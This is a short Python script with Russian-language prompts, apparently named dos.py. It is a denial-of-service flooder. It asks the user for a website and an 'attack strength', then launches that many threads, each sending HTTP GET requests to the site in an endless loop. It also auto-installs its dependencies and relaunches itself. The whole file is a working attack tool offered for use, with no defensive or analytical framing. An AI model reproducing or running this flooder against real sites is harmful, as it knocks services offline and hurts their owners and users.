from os import system
try:
	print("Инициализация...")
	import requests, webbrowser
	from colorama import Fore, Style, Back
	import threading
	import time

	def attack(n, name):
		i = 1	
		while True:
			try:
				response = requests.get(f"{site2}").text
				print(Fore.YELLOW + response)
				print(Fore.GREEN + f"Пакет послан {i}")
				print(Style.RESET_ALL)
				i = i + 1
			except requests.exceptions.ConnectionError:
				print(Fore.RED + "Такого сайта нет" + Style.RESET_ALL)
				exit()


	thread_list=[]

	system("clear")
	system("cls")
	site = input(Back.RED + Fore.BLACK + "Введите сайт: ")
	site2 = f"http://{site}"
	print(Style.RESET_ALL)
	op = input("Открыть атакуемый сайт? y/n: ")
	force = int(input("Введите силу аттаки: "))
	if op == "n" or op == "N":
		print("Атака начинается...")
		print("Чтобы прервать атаку нажмите ctrl+z")
		time.sleep(2)
		for i in range(force):
			t = threading.Thread(target=attack, args=(5,'Thread1'))
			thread_list.append(t)
			t.start()
	if op == "y" or op == "Y":
		print("Атака начинается...")
		print("Чтобы прервать атаку нажмите ctrl+z")
		time.sleep(2)
		webbrowser.open(site2)
		for i in range(force):
			t = threading.Thread(target=attack, args=(5,'Thread1'))
			thread_list.append(t)
			t.start()
except ModuleNotFoundError:
	print("Не найдены необходимые для работы модули. Устанавливаю их...")
	system("pip install colorama")
	system("pip install requests")
	system("python dos.py")
